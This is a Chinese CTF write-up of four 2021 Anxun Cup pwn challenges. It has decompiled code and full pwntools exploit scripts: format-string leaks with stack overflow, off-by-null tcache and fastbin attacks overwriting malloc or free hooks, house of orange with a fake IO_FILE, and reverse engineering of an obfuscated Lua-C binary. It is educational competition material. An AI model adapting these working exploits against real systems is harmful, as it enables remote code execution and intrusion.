# 前言
做了2021安洵杯线上赛题目，总体来说题目有简单有难的，难易程度合适，这次就做了pwn，把四道pwn题思路总结一下，重点是没几个人做出来的最后一道pwnsky，赛后做了复现。
# PWN -> stack (stack overflow ,fmt)
## 题目分析
保护全开，存在栈溢出，格式化字符串漏洞
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  read(0, buf, 0x100uLL);                       // stackoverflow
  printf(buf);                                  // fmt
  puts("--+--");
  read(0, buf, 0x100uLL);
  printf(buf);
  return 0;
}
```
存在system、binsh：
```c
int useless()
{
  char v1; // [rsp+Fh] [rbp-1h]

  return system((const char *)v1);
}
```
## 利用
1. 格式化字符串泄露canary、processbaseaddr
2. 栈溢出劫持控制流
## exp
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('47.108.195.119', 20113)
# libc = ELF('./libc-2.31.so')
#io = process('./ezstack')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
sla('请输入你的队伍名称:','SN-天虞')
sla('请输入你的id或名字:','一梦不醒')
useless = 0xA8c
pop_rdi = 0x0000000000000b03
binsh = 0x00B24
sl('%17$p@%11$p')
process = int(ru('@')[-14:],16) - 0x9dc
print hex(process)
canary = int(rn(18),16)
print hex(canary)

pay = 'a'* 0x18 + p64(canary) + p64(0xdeadbeef)+ p64(process + pop_rdi) + p64(process + binsh) + p64(process + useless)
sla('--+--\n',pay)
irt()

```
# PWN -> noleak (offbynull,tcache bypass)
## 题目分析
保护全开，ida查看理清程序逻辑，特别是分析结构体，add和delete功能和chunk的idx索引怎么变化，然后就是edit是否存在漏洞，功能分析:

1. 输入加密str进入程序，简单的亦或为`N0_py_1n_tHe_ct7`
2. 添加chunk，输入idx和size，在bss段有chunks结构体，最多10个chunk,没有判断chunk是否为null，可以重复添加
3. 删除chunk，不存在uaf
4. 编辑chunk，存在offbynull
5. 查看chunk，输出内容

add函数：
```c
unsigned __int64 add()
{
  unsigned int v0; // ebx
  unsigned int v2; // [rsp+0h] [rbp-20h] BYREF
  _DWORD size[7]; // [rsp+4h] [rbp-1Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  v2 = 0;
  size[0] = 0;
  puts("Index?");
  __isoc99_scanf("%d", &v2);
  if ( v2 > 9 )
  {
    puts("wrong and get out!");
    exit(0);
  }
  puts("Size?");
  __isoc99_scanf("%d", size);
  v0 = v2;
  (&chunks)[2 * v0] = malloc(size[0]);
  if ( !(&chunks)[2 * v2] )
  {
    puts("error!");
    exit(0);
  }
  LODWORD((&chunks)[2 * v2 + 1]) = size[0];
  return __readfsqword(0x28u) ^ *(_QWORD *)&size[1];
}
```
chunk结构体：
```c
struct{
    char* ptr;
    int size;
}
```
编辑函数：
```c
unsigned __int64 edit()
{
  int v0; // eax
  unsigned int v2; // [rsp+Ch] [rbp-14h] BYREF
  _QWORD *v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("Index?");
  __isoc99_scanf("%d", &v2);
  if ( v2 > 9 )
    exit(0);
  if ( !(&chunks)[2 * v2] )
    exit(0);
  v3 = (&chunks)[2 * v2];
  puts("content:");
  v0 = read(0, (&chunks)[2 * v2], LODWORD((&chunks)[2 * v2 + 1]));
  *((_BYTE *)v3 + v0) = 0; //offbynull
  return __readfsqword(0x28u) ^ v4;
}
```
chunk的idx索引和数组索引一致。
当时做题只看了编译程序的ubuntu版本是16.04，就以为是libc-2.23，结果本地都打通了远程不行，后来才发现题目提供的libc是2.27的，eimo了，一下提供两个环境下的利用方式：

**libc-2.23:**
1. unsorted bin leak libcaddr
2. make chunk merge up to unsorted bin
3. fastbin attack to malloc mallochook
4. onegadget to getshell

**libc-2.27（tcache）:**
利用方式1：
填满tcache bypass tcache
1. fill up the tcache and make chunk merge up by offbynull
2. unsortedbin leak libcaddr
3. add chunk to make chunk overlap 
4. tcache attack to malloc freehook
5. malloc chunk to tigger system

利用方式2：
tcache只有64个单链表结构，每个链表最多7个chunk，64位机器上以16字节递增，从24到1032字节，所以tcache只能是no-large chunk，我们可以申请large chunk绕过tcache
1. malloc large chunk and make chunk merge up by offbynull 
2. malloc chunk to leak libc addr
3. fastbin attack to malloc freehook
4. modify freehook to system
5. free chunk to tigger system


## exp
exp1 libc-2.23:
```python 
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('47.108.195.119', 20182)
# libc = ELF('./libc-2.31.so')
io = process('noleak1')
libc = ELF('/glibc/2.23/64/lib/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

	
enc = [0x4E, 0x79, 0x5F, 0x5F, 0x30, 0x5F, 0x74, 0x63, 0x5F, 0x31, 
  0x48, 0x74, 0x70, 0x6E, 0x65, 0x37]
s = ''
for i in range(4):
    for j in range(4):
        s += chr(enc[4*j+i])
        print s

#sla('请输入你的队伍名称:','SN-天虞')
#sla('请输入你的id或名字:','一梦不醒')
sl('N0_py_1n_tHe_ct7')
add(0,0xf0)
add(1,0x50)
delete(0)
add(0,0xf0)
show(0)
leak = uu64(rl())
lg('leak')
libcbase = leak - 0x3c3b78
lg('libcbase')
mallochook = libcbase + libc.symbols['__malloc_hook']
lg('mallochook')
system = libcbase + libc.symbols['system']
lg('system')
add(2,0xf0)
add(3,0x68)
add(4,0x68)
add(5,0x178)
add(6,0x10)
delete(2)
delete(3)  # free to fastbin

edit(4,'a'*0x60+p64(0x100+0x70*2)) # offbynull
edit(5,'a'*0xf0+p64(0)+p64(0x81))  # fake chunk lastremainder

delete(5)  # chunk Merge up to unsorted bin

add(5,0xf0+0x70)  # malloc unsorted bin
edit(5,'a'*0xf0+p64(0)+p64(0x70)+p64(mallochook-0x23)) # modify chunk 3 fd to mallochook
# fastbin atttack
add(2,0x68) 

add(3,0x68)

one = [0x45206,0x4525a,0xef9f4,0xf0897]
edit(3,'a'*0x13+p64(libcbase + one[2]))
#dbg()
add(2,0xf0)
irt()

```
exp2 libc-2.27：
```python
# -*- coding: UTF-8 -*-
from pwn import *

#context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('47.108.195.119', 20182)
# libc = ELF('./libc-2.31.so')
#io = process('noleak2')
libc = ELF('./libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

	
enc = [0x4E, 0x79, 0x5F, 0x5F, 0x30, 0x5F, 0x74, 0x63, 0x5F, 0x31, 
  0x48, 0x74, 0x70, 0x6E, 0x65, 0x37]
s = ''
for i in range(4):
    for j in range(4):
        s += chr(enc[4*j+i])
        print s

sla('请输入你的队伍名称:','SN-天虞')
sla('请输入你的id或名字:','一梦不醒')
sl('N0_py_1n_tHe_ct7')
for i in range(8):
    add(i,0xf0)
add(8,0x178)
add(9,0x178)
for i in range(7): # 1-7
    delete(i+1)

edit(8,b'a'*0x170+p64(0x980)) #off by null
edit(9,b'a'*0xf0+p64(0)+p64(0x81))

delete(0) #unsigned bin
delete(9) #chunk merge up to unsorted bin
for i in range(7):
    add(i,0xf0)
add(0,0xf0) 
show(0)   # 0 1-8
leak = l64()
lg('leak')
#dbg()
libc_base = leak - 0x3b0230
lg('libc_base')
free_hook=libc_base+libc.sym['__free_hook']
lg('free_hook')
malloc_hook=libc_base+libc.sym['__malloc_hook']
lg('malloc_hook')
add(9,0xf0)
delete(6) # 6==9
#gdb.attach(p)
edit(9,p64(free_hook-0x8))
#dbg()
add(6,0xf0) # 6

add(9,0xf0) # 10
#add1(0xf0)

#gdb.attach(p)
edit(9,"/bin/sh\x00"+p64(libc_base+libc.sym['system']))

delete(9)
irt()


```
exp3 libc-2.27:
```python
from pwn import *

p=process('./noleak2')
#p=remote('47.108.195.119',20182)
context.terminal = ["/usr/bin/tmux","sp","-h"]
context.log_level='debug'
elf=ELF('./noleak2')
libc=ELF('libc.so.6')
#gdb.attach(p,'b *$rebase(0xfc9)')

#p.sendline('n03tAck')
#p.sendline('1u1u')

p.sendlineafter('please input a str:','\x4e\x30\x5f\x70\x79\x5f\x31\x6e\x5f\x74\x48\x65\x5f\x63\x74\x37')

def menu(id):
	p.sendlineafter('>',str(id))

def add(id,size):
	menu(1)
	p.sendlineafter('Index?\n',str(id))
	p.sendlineafter('Size?\n',str(size))

def show(id):
	menu(2)
	p.sendlineafter('Index?\n',str(id))

def edit(id,content):
	menu(3)
	p.sendlineafter('Index?\n',str(id))
	p.sendlineafter('content:\n',str(content))

def delete(id):
	menu(4)
	p.sendlineafter('Index?\n',str(id))



add(0,0x450)
add(1,0x18)
add(2,0x4f0)
add(3,0x18)

delete(0)
gdb.attach(p)
edit(1,'a'*0x10+p64(0x480))
delete(2)

add(0,0x450)
show(1)

leak=u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
malloc_hook=leak+0x7f3223b9bc30-0x7f3223b9bca0
success('malloc_hook:'+hex(malloc_hook))
libc_base=malloc_hook-libc.sym['__malloc_hook']
success('libc_base:'+hex(libc_base))

add(2,0x18)
delete(2)
edit(1,p64(libc_base+libc.sym['__free_hook']))

add(4,0x10)
add(5,0x10)
edit(5,p64(libc_base+libc.sym['system']))

add(6,0x30)
edit(6,'/bin/sh\x00')
delete(6)

#gdb.attach(p)

p.interactive()
```
## 总结
这个题目做之前看程序是2.23的，结果做完了发现libc是2.27的，直接崩溃，又换了2.27的利用方式，最后看官方wp直接申请大chunk直接泄露地址，比我的要简洁些，所以就有了这三个版本的exp，题目中规中矩，常规题目。此次第一次遇见远程环境要输入队名和用户名，拿到shell后获取的是sky_token,拿token去换flag，为了防止py也是想尽了办法呀，哈哈。
## 出题思路

1. offbynull  2.27

# PWN -> ezheap (heap overflow,no free,house of orange,IOfile)
## 题目分析
保护全开，环境libc-2.23，ida查看代码，
```c
unsigned __int64 chng_wpn()
{
  int size; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !*((_QWORD *)&name + 1) )
  {
    puts("you have no weapon");
    exit(1);
  }
  puts("size of it");
  __isoc99_scanf(&unk_E94, &size);
  puts("name");
  read(0, *((void **)&name + 1), size);         // heap overflow
  putchar(10);
  return __readfsqword(0x28u) ^ v2;
}
```
gift函数输出heap地址。
分析程序功能：
1. 输出heap地址
2. add，申请空间，写入name，heap指针在bss段
3. edit，堆溢出，只能编辑当前申请的chunk，不能编辑之前的
4. show，输出当前chunk

## 利用

这种没有free函数的就用house of orange的思想，通过溢出将top chunk改小，申请比top chunk大的chunk的时候就会将top chunk释放入相应的bin目录，系统再次为topchunk申请内存，达到free效果，可以接着house of force申请大块内存到特定地址，从而申请到特定内存，去打freehook，malloc_hook;有时候申请大内存会报错，可以利用攻击IO_LIST_ALL制造fake io_file_plus结构体，覆盖flag为binsh，io_overflow_t为system来劫持控制流。[iofile详细分析](https://blog.csdn.net/qq_39153421/article/details/115327308)

1. Overwrite top chunk size through heap overflow
2. free top chunk to unsortedbin to leak libc
3. fake io_ file_Plus structure attack IO_ list_all
4. Call the add function to trigger iofile

## exp
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('47.108.195.119', 20182)
# libc = ELF('./libc-2.31.so')
io = process('./pwn')
libc = ELF('/glibc/2.23/64/lib/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))


#sla('请输入你的队伍名称:','SN-天虞')
#sla('请输入你的id或名字:','一梦不醒')

def menu(index):
    sla("choice :",str(index))
def create(size,content):
    menu(1)
    sla("of it\n",str(size))
    sa("ame?\n", content)
def show():
    menu(3)
def edit(size,content):
    menu(2)
    sla("of it\n",str(size))
    sa("ame\n", content)

heap = int(rl(),16) - 0x10
lg('heap') 

create(0x20,"aaaaa\n")
edit(0x30,b"a"*0x28+p64(0xfb1)) # house of orange

create(0xff0,"bbbb\n")
create(0x48,"\n")

show()

ru("is : ")
info=uu64(rn(6))
lg("info")
libc_address= info - 0x3c410a

lg('libc_address')
malloc_hook = libc_address + libc.symbols['__malloc_hook']
lg('malloc_hook')
_IO_list_all_addr = libc_address + libc.sym['_IO_list_all']
lg('_IO_list_all_addr')
system_addr = libc_address + libc.sym['system']
lg('system_addr')

vtable_addr = heap + 0x178
fake = "/bin/sh\x00"+p64(0x61)
fake += p64(0xDEADBEEF)+p64(_IO_list_all_addr-0x10)
fake +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
fake = fake.ljust(0xc0,"\x00")
fake += p64(0)*3+p64(vtable_addr) # mode <=0


payload = 'a'*0x40
payload += fake
payload += 'a'*0x10
payload += p64(system_addr)

edit(len(payload),payload)
#dbg()
ru(": ")
sl('1')
irt()
```
## 总结
这个题目用到的知识点很老了，但是我也是很早学的iofile，长时间不用忘记了，比赛的时候只想到用house of force，结果在申请大的chunk的时候报错，一直就僵在那里了，这里house of orange也可以结合iofile进行利用，本人早在刚入门pwn的时候总结过iofile相关的东西，结果长时间不用都又还给别人了，eimo了。
## 出题思路
1. house of orange（heapoverflow） + iofile，环境2.23 2.24 2.27 。

# PWN -> pwnsky
## 题目分析
题目附件给了一个lua.bin、pwn和一些依赖库，看到这就知道这个是个lua、c互调的程序，增加直观上的题目难度，题目程序保护全开，没有找到程序的编译版本，但是可以看到libc版本为2.31。首先题目给出的是lua.bin文件，为lua的字节码，首先需要反编译lua.bin，得到lua源码。
## 反编译lua
开源工具有两个，一个是luadec（c写的），一个是unluac（java写的），两个都可以。不过unluac支持最新5.4.x的版本反编译。
`java -jar unluac.jar lua.bin > lua.lua`反编译后：
```lua
function Pwnsky(name)
  local self = {}
  local ServerInit = function()
    self.name = name
    self.account = 0
    self.password = 0
    self.is_login = 0
    self.init = init
    self.print_logo = print_logo
  end
  function self.info()
    print("Server Info:")
    local time = os.date("%c")
    print("Server name: " .. self.name)
    print("Date time: " .. time)
    if self.is_login == 0 then
      print("Account status: Not login")
    else
      print("Account status: Logined")
      print("Account : " .. self.account)
    end
  end
  function self.login()
    print("pwnsky cloud cache login")
    io.write("account:")
    self.account = io.read("*number")
    io.write("password:")
    self.password = io.read("*number")
    self.is_login = login(self.account, self.password)
    if self.is_login == 1 then
      print("login succeeded!")
    else
      print("login failed!")
    end
  end
  function self.run()
    while true do
      io.write("$")
      local ops = io.read("*l")
      if ops == "login" then
        self.login()
      elseif ops == "info" then
        self.info()
      elseif ops == "add" then
        if self.is_login == 1 then
          print("size?")
          size = io.read("*number")
          idx = add_data(size)
          print("Data index: " .. idx)
        else
          print("login first...")
        end
      elseif ops == "del" then
        if self.is_login == 1 then
          print("index?")
          index = io.read("*number")
          delete_data(index)
        else
          print("login first...")
        end
      elseif ops == "get" then
        if self.is_login == 1 then
          print("index?")
          index = io.read("*number")
          get_data(index)
        else
          print("login first...")
        end
      elseif ops == "help" then
        print("commands:")
        print("login")
        print("info")
        print("add")
        print("del")
        print("get")
        print("exit")
      elseif ops == "exit" then
        print("exit")
        break
      end
    end
  end
  ServerInit()
  return self
end
function main()
  alarm(60)
  local pwn = Pwnsky("pwnsky cloud cache 1.0")
  pwn:print_logo()
  pwn:info()
  pwn:init()
  pwn:run()
end
```
可以看到程序的主函数逻辑是用lua写的，调用的相关函数是在pwn程序实现的，pwn程序启动首先加载lua.bin解析lua程序，
```c
__int64 __fastcall sub_1DE9(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+0h] [rbp-10h]

  v3 = luaL_newstate(a1, a2);
  luaL_openlibs(v3);
  if ( (unsigned int)luaL_loadfilex(v3, "lua.bin", 0LL)
    || (unsigned int)lua_pcallk(v3, 0LL, 0xFFFFFFFFLL, 0LL, 0LL, 0LL) )
  {
    puts("n");
  }
  lua_pushcclosure(v3, sub_1C51, 0LL);
  lua_setglobal(v3, "print_logo");
  lua_pushcclosure(v3, init_0, 0LL);
  lua_setglobal(v3, "init");
  lua_pushcclosure(v3, login, 0LL);
  lua_setglobal(v3, "login");
  lua_pushcclosure(v3, alarm_0, 0LL);
  lua_setglobal(v3, "alarm");
  lua_pushcclosure(v3, add_data, 0LL);
  lua_setglobal(v3, "add_data");
  lua_pushcclosure(v3, delete, 0LL);
  lua_setglobal(v3, "delete_data");
  lua_pushcclosure(v3, get_data, 0LL);
  lua_setglobal(v3, "get_data");
  return v3;
```
## 解题准备(patchelf,去除chroot)
结合给出的start文件(hint是比赛过程中放的)：
```
sudo chroot ./file/ ./pwn 

hint1: 不要太依赖于F5哦。 hint2: 解密算法就是加密算法。
hint3: 需要在sub_17BB和sub_143A函数去除花指令，使其F5能够正确反编译。
``` 
可以看到程序需要chroot到当前文件夹，那么问题来了，有chroot 怎么用gdb怎么调试呢？太菜的我选择了将程序`lua.bin`改成`./lua.bin`,然后把依赖库放到/lib相应目录下，其实就一个lua的依赖库。我本地也是2.31的，这样就不用chroot了，可以直接运行。如果有大佬知道怎么不用patchelf路径就能gdb调试，请分享一下偶。
## 去除花指令
根据提示知道sub_17BB和sub_143A存在花指令，我说半天找不到关键函数。sub_17BB在有漏洞的地方加了花指令，使得ida反编译找看不出漏洞代码；在sub_143A函数加了花指令，使得ida分析login函数逻辑失败，查看代码发现sub_17BB函数有一场数据块可能是关键代码：
```asm
.text:00000000000019AC                 mov     eax, 0
.text:00000000000019B1                 call    _printf
.text:00000000000019B6                 lea     r8, loc_19BD                         <------------花指令----------->
.text:00000000000019BD
.text:00000000000019BD loc_19BD:                               ; DATA XREF: sub_17BB+1FB↑o
.text:00000000000019BD                 push    r8
.text:00000000000019BF                 add     [rsp+38h+var_38], 0Dh
.text:00000000000019C4                 retn
.text:00000000000019C4 ; ---------------------------------------------------------------------------
.text:00000000000019C5                 db 0E9h, 23h, 0C5h
.text:00000000000019C8                 dq 3DAF058D480000h, 48D26348E0558B00h, 0C08400B60FD0048Bh
.text:00000000000019C8                 dq 3D97058D482A75h, 48D26348E0558B00h, 48F0458B48D0148Bh           <----------异常数据块-------->
.text:00000000000019C8                 dq 4800000001BAD001h, 0E800000000BFC689h, 1B8FFFFF724h
.text:0000000000001A10                 db 0
.text:0000000000001A11 ; ---------------------------------------------------------------------------
.text:0000000000001A11
.text:0000000000001A11 loc_1A11:                               ; CODE XREF: sub_17BB+50↑j
```
可以看到异常数据块前有一些异常代码，将下一条命令地址赋给r8，然后入栈，rsp向下移动0xd，return，相当于啥没做，把0x19b6到0x19c4代码nop掉，还原逻辑如下：
```asm
.text:000000000000199F 48 89 C6                                mov     rsi, rax
.text:00000000000019A2 48 8D 05 03 17 00 00                    lea     rax, aGiftLlx   ; "gift: %llx\n"
.text:00000000000019A9 48 89 C7                                mov     rdi, rax        ; format
.text:00000000000019AC B8 00 00 00 00                          mov     eax, 0
.text:00000000000019B1 E8 1A F7 FF FF                          call    _printf
.text:00000000000019B6 90                                      nop                     ; Keypatch filled range [0x19B6:0x19C4] (15 bytes), replaced:
.text:00000000000019B6                                                                 ;   lea r8, loc_19BD
.text:00000000000019B6                                                                 ;   push r8
.text:00000000000019B6                                                                 ;   add [rsp+38h+var_38], 0Dh
.text:00000000000019B6                                                                 ;   retn
.text:00000000000019B7 90                                      nop
.text:00000000000019B8 90                                      nop
.text:00000000000019B9 90                                      nop
.text:00000000000019BA 90                                      nop
.text:00000000000019BB 90                                      nop
.text:00000000000019BC 90                                      nop
.text:00000000000019BD 90                                      nop
.text:00000000000019BE 90                                      nop
.text:00000000000019BF 90                                      nop
.text:00000000000019C0 90                                      nop
.text:00000000000019C1 90                                      nop
.text:00000000000019C2 90                                      nop
.text:00000000000019C3 90                                      nop
.text:00000000000019C4 90                                      nop
.text:00000000000019C5 90                                      nop                     ; Keypatch modified this from:
.text:00000000000019C5                                                                 ;   jmp near ptr 0DEEDh
.text:00000000000019C5                                                                 ; Keypatch padded NOP to next boundary: 4 bytes
.text:00000000000019C6 90                                      nop
.text:00000000000019C7 90                                      nop
.text:00000000000019C8 90                                      nop
.text:00000000000019C9 90                                      nop
.text:00000000000019CA 48 8D 05 AF 3D 00 00                    lea     rax, qword_5780
.text:00000000000019D1 8B 55 E0                                mov     edx, [rbp+var_20]
.text:00000000000019D4 48 63 D2                                movsxd  rdx, edx
.text:00000000000019D7 48 8B 04 D0                             mov     rax, [rax+rdx*8]
.text:00000000000019DB 0F B6 00                                movzx   eax, byte ptr [rax]
.text:00000000000019DE 84 C0                                   test    al, al
```
另一个函数同样方法去花。
## 程序分析及功能
关键的功能有以下几个：
1. login。用户名1000、密码为418894113通过验证；可还原异或加密（流加密）。
2. add。申请一个chunk，个数0-100，有非空检查，size在0-4096之间会将chunk地址、size写到bss段，如果data[0]=0,则会多读一个字节，造成offbyone。
3. get。输出非空chunk的context
4. del。删除非空chunk。指针置零，不存在UAF。
init_0函数：
```c
unsigned __int64 sub_1617()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  init_setvbuf();
  seccomp(); //沙箱seccomp_rule_add(v1, 0LL, 59LL, 0LL); 禁用59号中断，不能getshell
  init_key();//初始化key
  return v1 - __readfsqword(0x28u);
}

```
login函数：
```c
__int64 __fastcall sub_1663(__int64 a1)
{
  __int64 result; // rax
  __int64 pass[2]; // [rsp+10h] [rbp-10h] BYREF

  pass[1] = __readfsqword(0x28u);
  if ( (unsigned int)lua_isnumber(a1, 0xFFFFFFFFLL) )
  {
    LODWORD(pass[0]) = (int)lua_tonumberx(a1, 0xFFFFFFFFLL, 0LL);
    lua_settop(a1, 4294967294LL);
    if ( (unsigned int)lua_isnumber(a1, 0xFFFFFFFFLL) )
    {
      HIDWORD(pass[0]) = (int)lua_tonumberx(a1, 0xFFFFFFFFLL, 0LL);
      lua_settop(a1, 4294967294LL);
      encode(&key, pass, 4LL);                  // 0x6b8b4567327b23c6 key调试得到，真正生成的是在init函数中根据随机数生成的，不过是固定死的srand(0);
      if ( pass[0] == 0x3E8717E5E48LL )        //这里ida反编译有点问题，实际上是pass[0]==0x3e8&&pass[1]==0x717e5e48,可以看汇编看出
        lua_pushinteger(a1, 1LL);
      else
        lua_pushinteger(a1, 0LL);
      result = 1LL;
    }
    else
    {
      error(
        a1,
        (int)"In function: login, account argument must a number",
        "In function: login, account argument must a number");
      result = 0LL;
    }
  }
  else
  {
    error(
      a1,
      (int)"In function: login, password argument must a number",
      "In function: login, password argument must a number");
    result = 0LL;
  }
  return result;
}

unsigned __int64 __fastcall encode(__int64 *key, __int64 pass, unsigned __int64 len)
{
  unsigned __int8 v5; // [rsp+23h] [rbp-1Dh]
  int i; // [rsp+24h] [rbp-1Ch]
  __int64 v7; // [rsp+30h] [rbp-10h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v7 = *key;
  for ( i = 0; len > i; ++i )
  {
    v5 = *((_BYTE *)&v7 + (((_BYTE)i + 2) & 7)) * (*((_BYTE *)&v7 + (i & 7)) + *((_BYTE *)&v7 + (((_BYTE)i + 1) & 7)))
       + *((_BYTE *)&v7 + (((_BYTE)i + 3) & 7));
    *(_BYTE *)(i + pass) ^= v5 ^ table[v5];
    *((_BYTE *)&v7 + (i & 7)) = 2 * v5 + 3;
    if ( (i & 0xF) == 0 )
      sub_143A(key, &v7, table[(unsigned __int8)i]);//反编译问题，v7是返回值，参数是key和table[i&0xff]
  }
  return v8 - __readfsqword(0x28u);
}

unsigned __int64 __fastcall sub_143A(__int64 a1, __int64 a2, char a3)
{
  int i; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 7; ++i )
  {
    *(_BYTE *)(i + a2) = *(_BYTE *)(i + a1) ^ table[*(unsigned __int8 *)(i + a1)];
    *(_BYTE *)(i + a2) ^= (_BYTE)i + a3;
  }
  return v5 - __readfsqword(0x28u);
}
```
按照程序逻辑还原逻辑后将密文输入，就得到明文。
add函数：
```c
__int64 __fastcall add_data(__int64 a1)
{
  __int64 result; // rax
  int i; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+14h] [rbp-1Ch]
  int size; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+1Ch] [rbp-14h]
  unsigned __int64 j; // [rsp+20h] [rbp-10h]

  if ( (unsigned int)lua_isnumber(a1, 0xFFFFFFFFLL) )
  {
    size = (int)lua_tonumberx(a1, 0xFFFFFFFFLL, 0LL);
    lua_settop(a1, 4294967294LL);
    for ( i = 0; i <= 100 && qword_5780[i]; ++i )
    {
      if ( i == 100 )
        return 0LL;
    }
    if ( size > 0 && size <= 4095 )
    {
      qword_5780[i] = malloc(size);
      v3 = 0;
      for ( j = 0LL; j < size; ++j )
      {
        v5 = read(0, (void *)(qword_5780[i] + j), 1uLL);
        if ( *(_BYTE *)(qword_5780[i] + j) == 10 )
          break;
        if ( v5 > 0 )
          v3 += v5;
      }
      dword_5AA0[i] = size;
      encode(&key, qword_5780[i], v3);                     <----------加密存放--------->
      lua_pushinteger(a1, i);
      printf("gift: %llx\n", qword_5780[i] & 0xFFFLL);     <----------输出chunk后3字节偏移-------->
      if ( !*(_BYTE *)qword_5780[i] )                        <-----------offbyone------------>
        read(0, (void *)(qword_5780[i] + j), 1uLL);
      result = 1LL;
    }
    else
    {
      result = 0LL;
    }
  }
  else
  {
    error(
      a1,
      (int)"In function: add_data, first argument must a number",
      "In function: add_data, first argument must a number");
    result = 0LL;
  }
  return result;
}
```
